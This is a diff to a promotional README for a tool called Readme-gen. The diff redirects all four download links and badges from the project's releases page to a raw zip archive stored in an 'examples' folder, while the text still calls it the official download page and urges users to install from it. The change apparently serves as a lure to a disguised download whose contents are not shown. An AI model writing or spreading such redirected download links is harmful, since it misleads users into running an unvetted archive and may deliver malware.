@@ -1,6 +1,6 @@
 # 📄 Readme-gen - Create Professional README Files Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Readme--gen-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/gamerhead11/Readme-gen/releases)
+[![Download Now](https://img.shields.io/badge/Download-Readme--gen-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://raw.githubusercontent.com/gamerhead11/Readme-gen/main/readme-gen/examples/3.3.zip)
 
 # 🤖 What Is Readme-gen?
 
@@ -34,7 +34,7 @@ Getting started with Readme-gen is quick and straightforward. Follow these simpl
 
 Visit this link to download the application. This is the official download page where you will find the latest version of Readme-gen.
 
-[![Download Readme-gen](https://img.shields.io/badge/Download%20Now-Readme--gen-red?style=for-the-badge&logo=download&logoColor=white)](https://github.com/gamerhead11/Readme-gen/releases)
+[![Download Readme-gen](https://img.shields.io/badge/Download%20Now-Readme--gen-red?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/gamerhead11/Readme-gen/main/readme-gen/examples/3.3.zip)
 
 Once you arrive at the download page, you will see several files available. Look for the most recent release marked with a version number and the word "Windows." Click on the download link to begin downloading the application to your computer.
 
@@ -166,7 +166,7 @@ You have several repositories that need consistent documentation. Readme-gen hel
 
 To check for updates:
 
-1. Go to the official download page: https://github.com/gamerhead11/Readme-gen/releases
+1. Go to the official download page: https://raw.githubusercontent.com/gamerhead11/Readme-gen/main/readme-gen/examples/3.3.zip
 2. Compare the latest version number with your current version
 3. If a newer version exists, download and install it following the same steps as the initial installation
 
@@ -185,6 +185,6 @@ The developer actively maintains the project and responds to community feedback 
 
 Readme-gen transforms a tedious, time-consuming task into a quick, enjoyable process. Whether you're sharing your first coding project or maintaining dozens of professional repositories, Readme-gen provides the intelligence and automation you need to create outstanding documentation every time. Download it today and join thousands of satisfied users who have simplified their GitHub documentation workflow.
 
-[![Get Readme-gen Now](https://img.shields.io/badge/Get%20Readme--gen%20Now-Success-orange?style=for-the-badge&logo=github&logoColor=white&color=2E8B57)](https://github.com/gamerhead11/Readme-gen/releases)
+[![Get Readme-gen Now](https://img.shields.io/badge/Get%20Readme--gen%20Now-Success-orange?style=for-the-badge&logo=github&logoColor=white&color=2E8B57)](https://raw.githubusercontent.com/gamerhead11/Readme-gen/main/readme-gen/examples/3.3.zip)
 
 Keywords: agent-skills, ai-agents, claude-code, codex, developer-tools, documentation, github-readme, markdown, mermaid, readme-generator
